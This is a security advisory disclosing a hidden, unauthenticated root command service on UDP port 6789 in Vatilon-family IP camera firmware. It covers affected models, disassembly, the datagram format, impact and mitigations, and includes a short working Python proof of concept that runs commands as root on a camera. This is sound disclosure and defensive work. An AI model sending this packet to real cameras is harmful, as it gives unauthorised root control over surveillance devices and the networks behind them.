# VATILON-2026-01 — Undocumented `system_wapper` service executes UDP-delivered commands as root without authentication

| | |
| --- | --- |
| Identifier | VATILON-2026-01 |
| CVE | requested, not yet assigned |
| CWE | CWE-912 (hidden functionality), CWE-306 (missing authentication for critical function) |
| CVSS v3.1 | **9.8 critical** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Status | Independent disclosure — the vendor was not contacted. Rationale in [README.md](README.md#disclosure-statement). Published `<date>`. |
| Fix available | **No.** Present and byte-identical in the vendor's current firmware. Not fixable on the device; see Mitigation. |

## Summary

IP camera firmware published by Shenzhen Vatilon Electronics and resold under several brands starts an undocumented service named `system_wapper` on every boot. It binds UDP port 6789 on all interfaces and passes the contents of any datagram it receives to `/bin/sh` as root, returning the command's output to the sender. There is no authentication, no source address check, and no way to disable it: the binary and the script that launches it both live in a read-only SquashFS.

Any host able to send a single UDP packet to the camera has interactive root on it.

The service is **byte-identical in `V1.16.39-20250721` and in `V1.18.09`**, the vendor's current release, twelve months apart.

## Affected

| Brand / model | Product code | Firmware | SoC | Verification |
| --- | --- | --- | --- | --- |
| SIMICAM A314D, sold and identifying over ONVIF as **Vatilon H80** | `P22H` | `V1.16.39-20250721` | HiSilicon hi3516cv610 | **Confirmed by execution on owned hardware** |
| Vatilon **H80 and H82** | `P22H` | `V1.18.09` (current) | HiSilicon hi3516cv610 | **Confirmed present and launched** by static analysis of the vendor's own update image; binary md5 identical to the row above |
| KEVIEW H43 | `P05H` | `V1.14.92-20241120` | Fullhan FH8852V201 | **Confirmed present and binding by disassembly** of a public firmware dump; no live device tested |

The H80/H82 grouping is the vendor's own — their update package is named `P22H_H82_H80_V1.18.09`.

Brands observed shipping this firmware family: SIMICAM, VATILON, KEVIEW, ASECAM, JIENUO. Those names come from the affected lists of previously published CVEs on this family and from resale listings, not from testing performed here — treat them as leads rather than confirmations. The confirmed builds span two silicon vendors (HiSilicon, Fullhan) and two C libraries (musl, uClibc), so `system_wapper` is compiled from vendor source into each platform build rather than copied as a binary. The affected product is the firmware family; the table lists only what has been checked.

Scoping note: the application binary also carries model identifiers `MYM74K-HTL` / `MYM75MP-HTL` and cloud endpoints for `microseven.com` and `home.360.cn`, indicating integrations for further downstream brands. That does not establish that any shipped Microseven or Qihoo 360 product runs an affected build, and no such claim is made here.

## Description

`/usr/app/run.sh` launches `/usr/app/bin/system_wapper` unconditionally at boot, with no configuration switch guarding it and no entry in any user-visible settings page.

The program is 9,508 bytes, stripped. Its entire dynamic import list:

```
socket, bind, recvfrom, sendto     UDP listener
popen, vfork, execl, "/bin/sh"     command execution
```

It links only libc, carries no SDK or HiSilicon symbols, and its diagnostic strings (`ERROR: get_system(%s),because:%s`, `GetCmdResult,has no result`) are bespoke — vendor-authored, not an SoC sample left enabled.

The service loop is `recvfrom` → `popen` (or `vfork`/`execl`) → `sendto`, running as root. The datagram format, from disassembly:

| Offset | Size | Meaning |
| --- | --- | --- |
| 0 | 4 | flag, little-endian. `0` = synchronous |
| 4 | 4 | mode, little-endian. Nonzero = run under `popen` and return stdout; zero = `execl` and return nothing |
| 8 | … | the command, NUL-terminated |

The reply is a 4-byte little-endian return code followed by the command's standard output, truncated to roughly 10 KB by the daemon's buffer.

The same routine is present in the Fullhan FH8852V201 build, compiled for a different ABI (ARM mode, hard-float, uClibc):

```
110b8:  movw r3, #6789          ; 0x1a85
110f0:  strh r3, [fp, #-36]     ; sin_family = AF_INET
110f8:  str  r3, [fp, #-32]     ; sin_addr   = INADDR_ANY
11108:  bl   htons              ; -> sin_port
11120:  bl   socket             ; (AF_INET, SOCK_DGRAM, 0)
111d4:  bl   bind               ; (fd, &sa, 16)
11278:  bl   recvfrom
```

`popen` and `sendto` are in the same program, and `run.sh` launches it unconditionally, as on the HiSilicon build.

## Proof of concept

```python
import socket, struct
pkt = struct.pack("<II", 0, 1) + b"id\x00"
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3)
s.sendto(pkt, ("<target>", 6789))
print(s.recv(65535))
# b'\x00\x00\x00\x00uid=0(root) gid=0(root)\n'
```

A fuller script, including escalation to an interactive shell, is in [`poc/vatilon_udp6789_rce.py`](poc/vatilon_udp6789_rce.py).

## Impact

Unauthenticated remote root. An attacker on the same segment can reconfigure the device, watch and tamper with the video, pivot into the rest of the network, and — because the update path checks a CRC32 and no signature (VATILON-2026-04) — write arbitrary firmware to flash, surviving a factory reset or bricking the camera.

UDP 6789 is not routable from the internet by default, which bounds the exposure without making it safe: any compromised host on the same LAN takes every one of these cameras instantly.

## Mitigation

There is no on-device fix. `system_wapper` is in a read-only filesystem, is relaunched every boot, and the firmware ships no `iptables`.

**Updating the firmware does not help.** The service is present and byte-identical in the vendor's current release, so an owner on an older build gains nothing here by updating.

**The firmware version in the web interface tells you whether a camera is affected.** The service is unconditional, so a version match settles it, and the version string reports everything a network probe would. A service-version scan (`nmap -sV`) adds a cost the version check does not carry: that probe crashes the firmware and takes the camera offline for minutes (VATILON-2026-05).

Two things actually work:

1. **Network isolation.** Put the camera on a segment reachable only by its recorder, with no other LAN access and no route to the internet.
2. **Replace the firmware.** OpenIPC supports the hi3516cv610 and removes the vendor application stack, `system_wapper` included. The published cv6xx image targets 16 MiB flash and does not fit these 8 MiB parts; an 8 MiB `lite` build for this SoC is linked from [README.md](README.md).

## Timeline

| Date | Event |
| --- | --- |
| 2026-09-11 | Discovered during an authentication audit of an owned camera |
| 2026-09-14 | Confirmed present on a second SoC family from a public firmware dump |
| 2026-09-28 | Confirmed present and byte-identical in the vendor's current firmware, `V1.18.09` |
| `<date>` | CVE ID requested from MITRE CNA-LR |
| `<date>` | Advisory published. The vendor was not notified — see [README.md](README.md#disclosure-statement) |

## Credit

Found and reported by [@eseverson](https://github.com/eseverson). All live testing was performed against hardware owned by the researcher; the second platform was assessed statically from a publicly published firmware dump.

## References

- Public firmware dump used for the second-platform confirmation: <https://github.com/pavliha/fh8852v201-dump> (its README documents `system_wapper` as "System watchdog")
- Previously published, unrelated defects in the same firmware family, all on the `web.cgi` surface: CVE-2025-63667, CVE-2025-67159, CVE-2025-67160
